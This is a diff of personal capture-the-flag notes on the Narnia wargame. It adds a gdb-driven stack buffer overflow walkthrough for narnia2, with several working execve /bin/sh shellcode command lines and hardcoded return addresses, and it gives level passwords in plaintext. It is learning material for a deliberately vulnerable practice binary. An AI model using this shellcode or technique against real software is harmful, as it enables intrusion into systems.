@@ -35,7 +35,7 @@ essentially (for me) three parts:
   3) Exploit it!
 
 
-### lvl-0
+# lvl-0
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -115,7 +115,18 @@ Woo!
 efeidiedae
 
 
-### lvl-1
+### Note on piping into processes
+`cat` is magic, at least in this instance. If you create a command group in bash
+by wrapping commands in parens and semi-colons: (cmd1; cmd2; ...)
+Then you can pipe it into something and each command will be treated as its own
+input to the next process. In this case, piping some input (via echo) chained
+with `cat` will keep the resultant shell process alive. This is because `cat`
+without an argument, `cat` will simply echo stdout.
+This seems to be a fairly common trick to keep a process reading from stdin
+alive in order for you to send more input to it.
+
+
+# lvl-1
 ```c
 #include <stdio.h>
 
@@ -178,7 +189,7 @@ Looking it up:
 nairiepecu
 
 
-### lvl-2
+# lvl-2
 ```c
 #include <stdio.h>
 #include <string.h>
@@ -212,3 +223,104 @@ BUGS
 ```
 
 Well THAT sounds like the sort of thing I'm after!
+
+
+#### Method
+Right, so from several tutorials it looks like the way to approach this is
+determine at what point we move from the program running correctly (even though
+we have started overwriting data on the stack) to segfaulting. Once we get a
+segfault we have tried to read garbage from the stack and if we can determine
+where that happens we can put something there to execute.
+##### NOTE
+This isn't so simple on modern systems as the compiler will bake in some checks
+that the program doesn't try to execute user writable memory.
+#### cont.
+So, it looks like an input of 140 characters causes a segfault. If we run under
+gdb we can see at what point we have completely overwritten the instruction
+pointer (the segfault error in gdb will (if our input is all "A"s) say something
+like `0x41414141 in ?? ()`. The first point we see this is when we have
+overwritten it.)
+So, we need to use `gdb` to determine where the start of our input ends up on
+the stack so that we can replace it with the `shell code` form narnia1.
+
+The shell-code I got from `pwntools` earlier was 44 bytes long so we want 96
+bytes of NOP? (As in: 96 NOP, 44 payload, 4 $esp)
+
+```
+(gdb) r $(python -c 'print "A" * 96 + "R" * 44 + "B" * 4')
+Starting program: /narnia/narnia2 $(python -c 'print "A" * 96 + "R" * 44 + "B" * 4')
+
+Breakpoint 1, 0x08048450 in main ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) x/200x $esp
+.
+.
+.
+0xffffd780:	0x6e2f6169	0x696e7261	0x41003261	0x41414141
+0xffffd790:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd7a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd7b0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd7c0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd7d0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd7e0:	0x41414141	0x41414141	0x52414141	0x52525252
+0xffffd7f0:	0x52525252	0x52525252	0x52525252	0x52525252
+0xffffd800:	0x52525252	0x52525252	0x52525252	0x52525252
+0xffffd810:	0x52525252	0x42525252	0x00424242	0x5f474458
+.
+.
+.
+```
+Soooooo...we want 0xffffd788?
+
+```bash
+narnia2@narnia:/narnia$ gdb ./narnia2 
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./narnia2...(no debugging symbols found)...done.
+(gdb) break main
+Breakpoint 1 at 0x8048450
+(gdb) r $(python -c 'print "A" * 96 + "jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80" + "\x88\xd7\xff\xff"')
+Starting program: /narnia/narnia2 $(python -c 'print "A" * 96 + "jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80" + "\x88\xd7\xff\xff"')
+
+Breakpoint 1, 0x08048450 in main ()
+(gdb) c
+Continuing.
+process 22117 is executing new program: /bin/dash
+Error in re-setting breakpoint 1: Function "main" not defined.
+$ whoami
+narnia2
+$ echo "HOLYFUCKITWORKEDMWAHAHAHAHAHA!"
+HOLYFUCKITWORKEDMWAHAHAHAHAHA!
+$ cat /etc/narnia_pass/narnia2    
+nairiepecu
+```
+
+For some reason, running outside of GDB causes it to still fail...ah, is this
+what the liveoverflow guys was saying about the contents of the stack changing
+based on what else was going on?
+
+
+### 28 bytes
+r $(python -c 'print "A" * 112 + "\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80" + "\xfb\xd7\xff\xff"')
+
+r $(python -c "'\x90' * 112 + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f' + '\x73\x68\x68\x2f\x62\x69\x6e\x89' + '\xe3\xb0\x0b\xcd\x80\x90\x90\x90' + '\xfb\xd7\xff\xff'")
+
+
+
+./narnia2 $(python -c 'print "A" * 112 + "\x6a\x17\x58\x31\xdb\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80" + "\x90\xf8\xd7\xff\xff"')
